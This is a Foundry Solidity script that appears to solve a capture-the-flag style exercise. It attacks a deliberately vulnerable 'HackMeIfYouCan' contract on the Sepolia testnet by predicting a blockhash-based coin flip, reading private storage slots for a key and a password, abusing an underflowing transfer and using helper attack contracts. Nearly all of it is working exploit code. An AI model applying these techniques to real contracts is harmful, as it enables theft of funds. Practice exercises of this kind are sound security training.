// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {AddPointHack} from "../src/AddPointHack.sol";
import {Building} from "../src/Building.sol";

contract HackMeIfYouCanScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;

    function run() public {
        // Sepolia testnet address
        vm.startBroadcast(vm.envUint("WALLET_PRIVATE_KEY"));
        hackMeIfYouCan = HackMeIfYouCan(
            0x9D29D33d4329640e96cC259E141838EB3EB2f1d9
        );

        // Hack flip function (execute 10 times on prod)
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        hackMeIfYouCan.flip(side);

        // Hack addPoint function
        AddPointHack addPointHack = new AddPointHack(address(hackMeIfYouCan));
        addPointHack.attackAddPoint();

        // Hack transfer
        hackMeIfYouCan.transfer(address(0), 1);

        // Hack goTo function
        Building building = new Building(address(hackMeIfYouCan));
        building.goToHack(2000);

        // Hack sendKey function
        bytes32 dataValue = vm.load(
            address(hackMeIfYouCan),
            bytes32(uint256(16))
        );
        hackMeIfYouCan.sendKey(bytes16(dataValue));

        // Hack sendPassword function
        bytes32 password = vm.load(
            address(hackMeIfYouCan),
            bytes32(uint256(3))
        );
        hackMeIfYouCan.sendPassword(password);

        // Hack receive() callBack function
        hackMeIfYouCan.contribute{value: 0.0001 ether}();
        (bool success, ) = address(hackMeIfYouCan).call{value: 0.0001 ether}(
            ""
        );
        require(success, "Ether transfer failed");

        console.log(
            "marks:",
            hackMeIfYouCan.getMarks(0x1A2cDc9Ea7dFc55aeaDb314bB8C3b09E938c989b)
        );
        vm.stopBroadcast();
    }
}

/* 
1. To load the .env in the shell:
-> source .env

2. To run the deploy script:
-> Simulation: forge script script/HackMeIfYouCan.s.sol --rpc-url $SEPOLIA_RPC_URL --private-key $WALLET_PRIVATE_KEY
-> Production: forge script script/HackMeIfYouCan.s.sol --rpc-url $SEPOLIA_RPC_URL --private-key $WALLET_PRIVATE_KEY --broadcast

*/
